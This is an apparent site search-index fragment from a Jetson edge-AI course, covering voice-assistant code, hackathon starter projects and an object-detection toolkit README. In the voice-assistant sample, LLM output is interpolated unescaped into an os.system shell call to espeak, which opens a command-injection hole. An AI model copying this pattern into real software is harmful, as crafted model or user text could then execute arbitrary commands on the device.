devices, combining local processing with powerful AI capabilities while maintaining privacy and security.</p> <pre><code>import whisper\nfrom llama_cpp import Llama\nimport os\n\nasr = whisper.load_model(\"base\")\nllm = Llama(model_path=\"/models/qwen.gguf\")\n\nwhile True:\n    os.system(\"arecord -d 5 -f cd input.wav\")\n    result = asr.transcribe(\"input.wav\")\n    print(\"You said:\", result['text'])\n\n    reply = llm(f\"Respond helpfully to: {result['text']}\")\n    print(\"LLM:\", reply)\n\n    os.system(f'espeak \"{reply}\"')\n</code></pre>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#optimize-latency-on-jetson","title":"\ud83e\udde0 Optimize Latency on Jetson","text":"<ul> <li>Use Whisper <code>tiny.en</code> for &lt;1s transcription</li> <li>Use <code>--num_threads=2</code> for llama-cpp</li> <li>Use quantized models (Q4_K_M, Q5_1)</li> <li>Avoid too-long prompts (&gt;300 tokens)</li> </ul>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#real-time-translation-mode","title":"\ud83c\udf0d Real-Time Translation Mode","text":"<ol> <li>Use Whisper for source language transcription</li> <li>Translate using multilingual model (M2M100)</li> <li>Use TTS to read out translation</li> </ol>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#sample-pipeline","title":"Sample Pipeline","text":"<pre><code>from transformers import M2M100ForConditionalGeneration, M2M100Tokenizer\n\ntokenizer = M2M100Tokenizer.from_pretrained(\"facebook/m2m100_418M\")\nmodel = M2M100ForConditionalGeneration.from_pretrained(\"facebook/m2m100_418M\")\n\nsrc_text = \"Bonjour, comment allez-vous?\"\ntokenizer.src_lang = \"fr\"\nencoded = tokenizer(src_text, return_tensors=\"pt\")\nout = model.generate(**encoded, forced_bos_token_id=tokenizer.get_lang_id(\"en\"))\nprint(tokenizer.decode(out[0], skip_special_tokens=True))\n</code></pre>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#lab-voice-controlled-translator","title":"\ud83e\uddea Lab: Voice-Controlled Translator","text":"<ol> <li>Speak in native language (e.g., Spanish)</li> <li>Jetson transcribes \u2192 translates \u2192 speaks in English</li> <li> <p>Measure latency and experiment with:</p> </li> <li> <p>Different Whisper models</p> </li> <li>TTS speed and quality</li> <li>LLM explanation (\"Translate and explain the meaning\")</li> </ol>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#advanced-use-multi-user-smart-home-assistant","title":"\ud83e\udde0 Advanced Use: Multi-User Smart Home Assistant","text":"<p>Jetson can distinguish between users and respond differently using voice and vision inputs:</p>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#visual-face-identification","title":"\ud83d\udd0d Visual Face Identification","text":"<p>Use a simple face recognition library to assign user identity:</p> <pre><code>import face_recognition\nimport cv2\n\nframe = cv2.imread(\"user_image.jpg\")\nfaces = face_recognition.face_encodings(frame)\nuser = match_user(faces[0])  # Match to known encoding database\n</code></pre>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#personalized-llm-prompting","title":"\ud83d\udd04 Personalized LLM Prompting","text":"<pre><code>reply = llm(f\"You are talking to {user}. Customize response based on history.\")\n</code></pre>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#speaker-identification-optional","title":"\ud83d\udde3\ufe0f Speaker Identification (Optional)","text":"<p>Use speaker embedding techniques (e.g., pyannote-audio) to classify who is speaking.</p>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#vision-audio-multimodal-interaction","title":"\ud83c\udfa5 Vision + Audio Multimodal Interaction","text":"<p>Combine:</p> <ul> <li>\ud83c\udf99\ufe0f Whisper for voice command</li> <li>\ud83e\udde0 LLM for reasoning</li> <li>\ud83d\udc41\ufe0f YOLO or OWL-ViT to detect objects</li> </ul>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#example","title":"Example:","text":"<p>\"Is there a person wearing red in the room?\"</p> <p>Steps:</p> <ol> <li>Capture frame with OpenCV</li> <li>Detect objects and people</li> <li>Send detection results to LLM</li> <li>LLM analyzes and replies:</li> </ol> <p>\"Yes, one person is wearing red near the doorway.\"</p>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#demo-local-smart-home-voice-control","title":"\ud83c\udfe1 Demo: Local Smart Home Voice Control","text":"<ol> <li>Whisper + LLM processes:</li> </ol> <p>\"Turn on the living room light\" 2. Parse intent 3. Call <code>mqtt.publish(\"home/livingroom/light\", \"on\")</code></p> <p>Combine:</p> <ul> <li>Voice input</li> <li>Vision context</li> <li>LLM reasoning</li> <li>Home automation API</li> </ul>"},{"location":"curriculum/my_10b_voice_assistant_jetson/#takeaway","title":"\ud83e\udde0 Takeaway","text":"<ul> <li>Jetson enables local, private AI assistants</li> <li>Multimodal inputs increase context and precision</li> <li>Personalize interactions with user identity</li> <li>Smart home automation becomes intelligent and interactive</li> </ul> <p>Next: Package this into a container and deploy to multiple Jetson nodes in the classroom!</p>"},{"location":"curriculum/my_11_final_challenges_hackathon/","title":"\ud83c\udfc1 Final Project: Hackathon &amp; Challenges","text":""},{"location":"curriculum/my_11_final_challenges_hackathon/#purpose","title":"\ud83c\udf93 Purpose","text":"<p>The final stage of this Jetson course is a hands-on Hackathon project. Students will work in teams to design, build, and demonstrate a real-world AI+Cyber application on Jetson Orin Nano.</p>"},{"location":"curriculum/my_11_final_challenges_hackathon/#project-themes-and-tutorials","title":"\ud83d\udca1 Project Themes and Tutorials","text":""},{"location":"curriculum/my_11_final_challenges_hackathon/#1-ai-agent","title":"1. \ud83e\udd16 AI Agent","text":"<p>Create a local LLM-powered assistant using llama.cpp or Ollama with basic tool usage.</p>"},{"location":"curriculum/my_11_final_challenges_hackathon/#starting-code","title":"\ud83e\uddf0 Starting Code","text":"<pre><code>from langchain.tools import PythonREPLTool\nfrom langchain.agents import initialize_agent, AgentType\nfrom langchain.llms import LlamaCpp\n\nllm = LlamaCpp(model_path=\"/models/mistral.gguf\", n_gpu_layers=60)\ntools = [PythonREPLTool()]\n\n# TODO: Add your own custom tool, e.g., file reader or command runner\n\nagent = initialize_agent(tools, llm, agent=AgentType.ZERO_SHOT_REACT_DESCRIPTION, verbose=True)\nresponse = agent.run(\"What is 15 squared?\")\nprint(response)\n</code></pre>"},{"location":"curriculum/my_11_final_challenges_hackathon/#student-task","title":"\ud83d\udee0\ufe0f Student Task","text":"<ul> <li> Add memory to retain multi-turn conversation</li> <li> Add 1\u20132 custom tools (e.g., File system or network scanner)</li> <li> Refine the prompt formatting and output parsing</li> </ul>"},{"location":"curriculum/my_11_final_challenges_hackathon/#evaluation-benchmark","title":"\ud83e\uddea Evaluation Benchmark","text":"Metric Points Competition Benchmark Tool integration 4 Longest tool chain executed correctly Use of memory 3 Number of coherent multi-turn queries Custom prompt 3 Best response formatting and clarity"},{"location":"curriculum/my_11_final_challenges_hackathon/#2-rag-application","title":"2. \ud83e\udde0 RAG Application","text":"<p>Build a local document-based question answering tool using LangChain.</p>"},{"location":"curriculum/my_11_final_challenges_hackathon/#starting-code_1","title":"\ud83e\uddf0 Starting Code","text":"<pre><code>from langchain.document_loaders import TextLoader\nfrom langchain.vectorstores import Chroma\nfrom langchain.embeddings import SentenceTransformerEmbeddings\nfrom langchain.chains import RetrievalQA\nfrom langchain.llms import LlamaCpp\n\nloader = TextLoader(\"data.txt\")\ndocs = loader.load()\n\n# TODO: Add a document splitter and support for multiple file types\n\nembedding = SentenceTransformerEmbeddings(model_name=\"all-MiniLM-L6-v2\")\nvectorstore = Chroma.from_documents(docs, embedding, persist_directory=\"ragdb\")\nretriever = vectorstore.as_retriever()\nllm = LlamaCpp(model_path=\"/models/mistral.gguf\")\nqa = RetrievalQA.from_chain_type(llm=llm, retriever=retriever)\n\nquery = \"What is Jetson used for?\"\nprint(qa.run(query))\n</code></pre>"},{"location":"curriculum/my_11_final_challenges_hackathon/#student-task_1","title":"\ud83d\udee0\ufe0f Student Task","text":"<ul> <li> Chunk large documents into sections</li> <li> Add PDF, Markdown, or log file loaders</li> <li> Enhance retrieval ranking</li> </ul>"},{"location":"curriculum/my_11_final_challenges_hackathon/#evaluation-benchmark_1","title":"\ud83e\uddea Evaluation Benchmark","text":"Metric Points Competition Benchmark Retriever accuracy 4 % of correct answers over 5 known queries Prompt clarity 3 # of correct follow-ups generated by prompt Model efficiency 3 Avg token/s for answering RAG queries"},{"location":"curriculum/my_11_final_challenges_hackathon/#3-vision-llm-hybrid","title":"3. \ud83c\udfa5 Vision + LLM Hybrid","text":"<p>Use a CNN model (e.g., YOLO) to generate object detection data, then describe it with an LLM.</p>"},{"location":"curriculum/my_11_final_challenges_hackathon/#starting-code_2","title":"\ud83e\uddf0 Starting Code","text":"<pre><code>import torch\nfrom transformers import pipeline\nfrom PIL import Image\n\nlabels = [\"cat\", \"laptop\"]  # TODO: Replace with real detection output\ncaption = \", \".join(labels)\n\npipe = pipeline(\"text-generation\", model=\"sshleifer/tiny-gpt2\")\nprompt = f\"Image contains: {caption}. Describe the scene.\"\nresponse = pipe(prompt, max_length=50)\nprint(response[0]['generated_text'])\n</code></pre>"},{"location":"curriculum/my_11_final_challenges_hackathon/#student-task_2","title":"\ud83d\udee0\ufe0f Student Task","text":"<ul> <li> Integrate live YOLO detection</li> <li> Replace tiny-gpt2 with local LLM</li> <li> Optimize runtime and output parsing</li> </ul>"},{"location":"curriculum/my_11_final_challenges_hackathon/#evaluation-benchmark_2","title":"\ud83e\uddea Evaluation Benchmark","text":"Metric Points Competition Benchmark Working detection 4 # of unique object classes detected LLM explanation 3 Scene description detail score (1\u20135) Real-time speed 3 FPS running detection + response pipeline"},{"location":"curriculum/my_11_final_challenges_hackathon/#4-cybersecurity-with-ai","title":"4. \ud83d\udd10 Cybersecurity with AI","text":"<p>Monitor Linux system and use an LLM to interpret logs and detect issues.</p>"},{"location":"curriculum/my_11_final_challenges_hackathon/#starting-code_3","title":"\ud83e\uddf0 Starting Code","text":"<pre><code>import os\nfrom langchain.llms import LlamaCpp\nfrom langchain.chains import RetrievalQA\nfrom langchain.vectorstores import Chroma\nfrom langchain.document_loaders import TextLoader\nfrom langchain.embeddings import SentenceTransformerEmbeddings\n\nos.system(\"ps aux &gt; logs/ps_snapshot.txt\")\nloader = TextLoader(\"logs/ps_snapshot.txt\")\ndocs = loader.load()\n\n# TODO: Add log sources like auth.log, netstat, custom scanner\n\nembedding = SentenceTransformerEmbeddings(model_name=\"all-MiniLM-L6-v2\")\nvectorstore = Chroma.from_documents(docs, embedding)\nllm = LlamaCpp(model_path=\"/models/mistral.gguf\")\nqa = RetrievalQA.from_chain_type(llm=llm, retriever=vectorstore.as_retriever())\nprint(qa.run(\"Are there suspicious processes running?\"))\n</code></pre>"},{"location":"curriculum/my_11_final_challenges_hackathon/#student-task_3","title":"\ud83d\udee0\ufe0f Student Task","text":"<ul> <li> Add log variety and real-time updates</li> <li> Present findings with a dashboard or alerts</li> <li> Use multiple prompts to explain risk levels</li> </ul>"},{"location":"curriculum/my_11_final_challenges_hackathon/#evaluation-benchmark_3","title":"\ud83e\uddea Evaluation Benchmark","text":"Metric Points Competition Benchmark Log coverage 4 # of log types and anomaly cases detected LLM explanation quality 3 Top 3 log explanations judged for clarity Monitoring loop/script 3 # of alerts issued over 5 minutes of test run"},{"location":"curriculum/my_11_final_challenges_hackathon/#general-requirements","title":"\u2705 General Requirements","text":"<ul> <li>Project must run on Jetson (no cloud dependency)</li> <li>At least one local LLM must be used (Ollama or llama-cpp)</li> <li>Prompt design must be part of the logic</li> <li>Modular and documented code preferred</li> </ul>"},{"location":"curriculum/my_11_final_challenges_hackathon/#submission-checklist","title":"\ud83d\udce6 Submission Checklist","text":"<ul> <li> Working code repo (GitHub or .zip)</li> <li> README with instructions</li> <li> 2-minute demo video (screen or camera)</li> <li> Team names and GitHub handles</li> </ul>"},{"location":"curriculum/my_11_final_challenges_hackathon/#takeaway","title":"\ud83e\udde0 Takeaway","text":"<p>This is your chance to apply:</p> <ul> <li>Jetson-accelerated AI</li> <li>Prompt engineering</li> <li>Local inference</li> <li>Cyber/LLM integration</li> </ul> <p>Build something useful. Make it private. Make it fast. Make it edge-native on Jetson!</p>"},{"location":"curriculum/my_objectdetection_README/","title":"Jetson Object Detection Toolkit","text":"<p>A comprehensive all-in-one object detection solution optimized for NVIDIA Jetson devices, featuring multiple state-of-the-art models with TensorRT acceleration support.</p>"},{"location":"curriculum/my_objectdetection_README/#features","title":"\ud83d\ude80 Features","text":""},{"location":"curriculum/my_objectdetection_README/#supported-models","title":"Supported Models","text":"<ul> <li>YOLOv8: Fast traditional object detection with TensorRT optimization</li> <li>OWL-ViT: Zero-shot detection with natural language prompts</li> <li>GroundingDINO: Superior zero-shot detection with complex queries</li> <li>YOLO + CLIP: Two-step detection and semantic classification</li> <li>YOLO + BLIP: Detection with rich natural language descriptions</li> <li>Multi-Modal: Comprehensive scene analysis using multiple models</li> </ul>"},{"location":"curriculum/my_objectdetection_README/#key-capabilities","title":"Key Capabilities","text":"<ul> <li>\ud83d\udd25 TensorRT Acceleration: Optimized inference for Jetson Orin</li> <li>\ud83d\udcca Real-time Performance Monitoring: FPS, memory usage, inference time</li> <li>\ud83c\udfaf Zero-shot Detection: Detect any object using text descriptions</li> <li>\ud83e\udde0 Multi-modal Analysis: Combine multiple models for comprehensive understanding</li> <li>\ud83d\udcc8 Comprehensive Benchmarking: Compare model performance across scenarios</li> <li>\ud83c\udfa8 Rich Visualizations: Advanced detection result display</li> <li>\ud83d\udcdd Automated Reporting: Generate detailed analysis reports</li> </ul>"},{"location":"curriculum/my_objectdetection_README/#installation","title":"\ud83d\udce6 Installation","text":""},{"location":"curriculum/my_objectdetection_README/#prerequisites","title":"Prerequisites","text":"<ul> <li>NVIDIA Jetson Orin (recommended) or compatible CUDA device</li> <li>Python 3.8+</li> <li>CUDA 11.8+ (for GPU acceleration)</li> </ul>"},{"location":"curriculum/my_objectdetection_README/#quick-setup","title":"Quick Setup","text":"<pre><code># Clone the repository\ngit clone &lt;repository-url&gt;\ncd edgeAI/docs/curriculum\n\n# Install dependencies\npip install -r requirements.txt\n\n# For TensorRT support on Jetson (optional but recommended)\n# Follow NVIDIA's TensorRT installation guide for your Jetson device\n</code></pre>"},{"location":"curriculum/my_objectdetection_README/#jetson-specific-setup","title":"Jetson-Specific Setup","text":"<pre><code># Install JetPack SDK (includes TensorRT)\nsudo apt update\nsudo apt install nvidia-jetpack\n\n# Install Python packages optimized for Jetson\npip install torch torchvision --index-url https://download.pytorch.org/whl/cu118\npip install ultralytics transformers\n\n# Verify TensorRT installation\npython3 -c \"import tensorrt; print(f'TensorRT version: {tensorrt.__version__}')\"\n</code></pre>"},{"location":"curriculum/my_objectdetection_README/#quick-start","title":"\ud83c\udfaf Quick Start","text":""},{"location":"curriculum/my_objectdetection_README/#basic-usage","title":"Basic Usage","text":"<pre><code># Real-time detection with webcam using YOLO\npython3 jetson_object_detection_toolkit.py --model yolo --input camera\n\n# Zero-shot detection with custom prompts\npython3 jetson_object_detection_toolkit.py --model owlvit --input camera --prompts \"person\" \"laptop\" \"coffee cup\"\n\n# Process single image with GroundingDINO\npython3 jetson_object_detection_toolkit.py --model grounding-dino --input image.jpg --text-prompt \"person holding a laptop\"\n\n# Multi-modal scene analysis\npython3 jetson_object_detection_toolkit.py --model multi-modal --input camera --prompts \"person\" \"vehicle\" \"furniture\"\n</code></pre>"},{"location":"curriculum/my_objectdetection_README/#advanced-usage","title":"Advanced Usage","text":"<pre><code># Enable TensorRT acceleration\npython3 jetson_object_detection_toolkit.py --model yolo --tensorrt --precision fp16\n\n# Two-step detection with CLIP classification\npython3 jetson_object_detection_toolkit.py --model yolo-clip --input camera --prompts \"office equipment\" \"furniture\" \"electronics\"\n\n# Rich descriptions with BLIP\npython3 jetson_object_detection_toolkit.py --model yolo-blip --input image.jpg\n\n# Save results and generate report\npython3 jetson_object_detection_toolkit.py --model yolo --input camera --save-results --generate-report --output-dir ./results\n</code></pre>"},{"location":"curriculum/my_objectdetection_README/#performance-benchmarking","title":"\ud83d\udcca Performance Benchmarking","text":""},{"location":"curriculum/my_objectdetection_README/#run-comprehensive-benchmark","title":"Run Comprehensive Benchmark","text":"<pre><code># Benchmark all models with 100 test images\npython3 jetson_object_detection_toolkit.py --benchmark --benchmark-images 100\n\n# Benchmark specific model\npython3 jetson_object_detection_toolkit.py --model yolo --benchmark --tensorrt\n\n# Advanced analysis\npython3 jetson_object_detection_toolkit.py --advanced-analysis optimization-impact\n</code></pre>"},{"location":"curriculum/my_objectdetection_README/#sample-benchmark-results","title":"Sample Benchmark Results","text":"<pre><code>================================================================================\nPERFORMANCE COMPARISON\n================================================================================\nModel                FPS        Time(ms)     Memory(MB)   Detections  \n--------------------------------------------------------------------------------\nYOLO                 45.2       22.1         156.3        4.2         \nYOLO+TensorRT        67.8       14.7         142.1        4.2         \nYOLO+CLIP            19.1       52.3         234.7        3.8         \nOWL-ViT              3.5        287.4        312.1        3.1         \nGroundingDINO        2.4        412.8        398.9        4.7         \n================================================================================\n\nRECOMMENDATIONS:\n  Real Time: YOLO+TensorRT\n  High Accuracy: GroundingDINO\n  Resource Constrained: YOLO\n  Balanced: YOLO+CLIP\n</code></pre>"},{"location":"curriculum/my_objectdetection_README/#configuration-options","title":"\ud83d\udd27 Configuration Options","text":""},{"location":"curriculum/my_objectdetection_README/#model-parameters","title":"Model Parameters","text":"<pre><code># YOLO model selection\n--yolo-model yolov8n.pt    # Nano (fastest)\n--yolo-model yolov8s.pt    # Small (balanced)\n--yolo-model yolov8m.pt    # Medium (accurate)\n--yolo-model yolov8l.pt    # Large (most accurate)\n\n# Precision settings\n--precision fp32           # Full precision\n--precision fp16           # Half precision (recommended for Jetson)\n\n# Device selection\n--device cuda              # GPU acceleration\n--device cpu               # CPU inference\n</code></pre>"},{"location":"curriculum/my_objectdetection_README/#detection-parameters","title":"Detection Parameters","text":"<pre><code># Confidence thresholds\n--conf-threshold 0.5       # YOLO confidence threshold\n--score-threshold 0.3      # Zero-shot model threshold\n\n# Text prompts for zero-shot models\n--prompts \"person\" \"car\" \"laptop\"                    # OWL-ViT prompts\n--text-prompt \"person holding a laptop in office\"   # GroundingDINO prompt\n</code></pre>"},{"location":"curriculum/my_objectdetection_README/#output-options","title":"Output Options","text":"<pre><code># Save options\n--save-results             # Save detection results as JSON\n--save-video output.mp4    # Save annotated video\n--output-dir ./results     # Output directory\n\n# Visualization\n--no-display              # Disable live display\n--generate-report         # Create comprehensive report\n</code></pre>"},{"location":"curriculum/my_objectdetection_README/#advanced-features","title":"\ud83e\uddea Advanced Features","text":""},{"location":"curriculum/my_objectdetection_README/#multi-modal-scene-analysis","title":"Multi-Modal Scene Analysis","text":"<p>Combines multiple models for comprehensive scene understanding:</p> <pre><code># Example: Comprehensive scene analysis\nanalyzer = MultiModalSceneAnalyzer(device=\"cuda\", precision=\"fp16\")\nresult = analyzer.analyze_scene(image, context_prompts=[\"person\", \"laptop\", \"office\"])\n\nprint(f\"Total detections: {result['analysis_summary']['total_detections']}\")\nprint(f\"Unique objects: {result['analysis_summary']['unique_objects']}\")\n</code></pre>"},{"location":"curriculum/my_objectdetection_README/#custom-model-integration","title":"Custom Model Integration","text":"<p>Extend the toolkit with your own models:</p> <pre><code>class CustomDetector(BaseDetector):\n    def __init__(self, model_path, device=\"cuda\"):\n        super().__init__(device)\n        self.load_model(model_path)\n\n    def detect(self, image, **kwargs):\n        # Implement your detection logic\n        return DetectionResult(boxes=[], scores=[], labels=[])\n</code></pre>"},{"location":"curriculum/my_objectdetection_README/#performance-optimization-tips","title":"Performance Optimization Tips","text":"<ol> <li>TensorRT Acceleration: Always use <code>--tensorrt</code> flag for Jetson devices</li> <li>Precision: Use <code>--precision fp16</code> for 2x speedup with minimal accuracy loss</li> <li>Model Selection: Choose appropriate YOLO model size based on requirements</li> <li>Batch Processing: For multiple images, process in batches when possible</li> <li>Memory Management: Monitor memory usage with built-in performance monitoring</li> </ol>"},{"location":"curriculum/my_objectdetection_README/#use-case-examples","title":"\ud83d\udcc8 Use Case Examples","text":""},{"location":"curriculum/my_objectdetection_README/#real-time-security-monitoring","title":"Real-time Security Monitoring","text":"<pre><code># Detect people and vehicles in real-time\npython3 jetson_object_detection_toolkit.py \\\n    --model yolo \\\n    --tensorrt \\\n    --input camera \\\n    --conf-threshold 0.6 \\\n    --save-video security_feed.mp4\n</code></pre>"},{"location":"curriculum/my_objectdetection_README/#flexible-object-search","title":"Flexible Object Search","text":"<pre><code># Search for specific objects using natural language\npython3 jetson_object_detection_toolkit.py \\\n    --model grounding-dino \\\n    --input camera \\\n    --text-prompt \"red fire extinguisher on the wall\"\n</code></pre>"},{"location":"curriculum/my_objectdetection_README/#inventory-management","title":"Inventory Management","text":"<pre><code># Classify detected objects into categories\npython3 jetson_object_detection_toolkit.py \\\n    --model yolo-clip \\\n    --input camera \\\n    --prompts \"electronics\" \"furniture\" \"office supplies\" \"safety equipment\"\n</code></pre>"},{"location":"curriculum/my_objectdetection_README/#scene-description","title":"Scene Description","text":"<pre><code># Generate rich descriptions of detected objects\npython3 jetson_object_detection_toolkit.py \\\n    --model yolo-blip \\\n    --input image.jpg \\\n    --save-results\n</code></pre>"},{"location":"curriculum/my_objectdetection_README/#troubleshooting","title":"\ud83d\udd0d Troubleshooting","text":""},{"location":"curriculum/my_objectdetection_README/#common-issues","title":"Common Issues","text":"<ol> <li> <p>CUDA Out of Memory <pre><code># Use smaller model or reduce precision\n--yolo-model yolov8n.pt --precision fp16\n</code></pre></p> </li> <li> <p>TensorRT Not Found <pre><code># Install TensorRT or disable acceleration\npip install tensorrt  # or use --no-tensorrt\n</code></pre></p> </li> <li> <p>Low FPS Performance <pre><code># Enable all optimizations\n--tensorrt --precision fp16 --yolo-model yolov8n.pt\n</code></pre></p> </li> <li> <p>Model Download Issues <pre><code># Pre-download models\npython3 -c \"from ultralytics import YOLO; YOLO('yolov8n.pt')\"\n</code></pre></p> </li> </ol>"},{"location":"curriculum/my_objectdetection_README/#performance-tuning","title":"Performance Tuning","text":"<ul> <li>Jetson Orin Nano: Use YOLOv8n with TensorRT for 30+ FPS</li> <li>Jetson Orin NX: Use YOLOv8s with TensorRT for optimal balance</li> <li>Jetson AGX Orin: Use YOLOv8m or larger models for maximum accuracy</li> </ul>"},{"location":"curriculum/my_objectdetection_README/#api-reference","title":"\ud83d\udcda API Reference","text":""},{"location":"curriculum/my_objectdetection_README/#core-classes","title":"Core Classes","text":"<ul> <li><code>OptimizedYOLODetector</code>: Fast traditional object detection</li> <li><code>OptimizedOWLViTDetector</code>: Zero-shot detection with text prompts</li> <li><code>GroundingDINODetector</code>: Advanced zero-shot detection</li> <li><code>YOLOCLIPDetector</code>: Two-step detection and classification</li> <li><code>YOLOBLIPDetector</code>: Detection with rich descriptions</li> <li><code>MultiModalSceneAnalyzer</code>: Comprehensive scene analysis</li> <li><code>PerformanceBenchmark</code>: Model performance evaluation</li> </ul>"},{"location":"curriculum/my_objectdetection_README/#detection-result-format","title":"Detection Result Format","text":"<pre><code>@dataclass\nclass DetectionResult:\n    boxes: List[List[float]]      # [x1, y1, x2, y2] coordinates\n    scores: List[float]           # Confidence scores\n    labels: List[str]             # Object labels\n    descriptions: List[str]       # Rich descriptions (optional)\n    inference_time: float         # Inference time in seconds\n    memory_usage: float           # Memory usage in MB\n</code></pre>"},{"location":"curriculum/my_objectdetection_README/#contributing","title":"\ud83e\udd1d Contributing","text":"<p>Contributions are welcome! Please feel free to submit issues, feature requests, or pull requests.</p>"},{"location":"curriculum/my_objectdetection_README/#development-setup","title":"Development Setup","text":"<pre><code># Install development dependencies\npip install pytest black flake8\n\n# Run tests\npytest tests/\n\n# Format code\nblack jetson_object_detection_toolkit.py\n</code></pre>"},{"location":"curriculum/my_objectdetection_README/#license","title":"\ud83d\udcc4 License","text":"<p>This project is licensed under the MIT License - see the LICENSE file for details.</p>"},{"location":"curriculum/my_objectdetection_README/#acknowledgments","title":"\ud83d\ude4f Acknowledgments","text":"<ul> <li>Ultralytics for YOLOv8</li> <li>Hugging Face for Transformers library</li> <li>NVIDIA for TensorRT optimization</li> <li>OpenAI for CLIP model</li> <li>Salesforce for BLIP model</li> <li>IDEA Research for GroundingDINO</li> </ul>"},{"location":"curriculum/my_objectdetection_README/#support","title":"\ud83d\udcde Support","text":"<p>For questions, issues, or support: - Create an issue on GitHub - Check the troubleshooting section - Review the API documentation</p> <p>Happy Detecting! \ud83c\udfaf</p>"}]}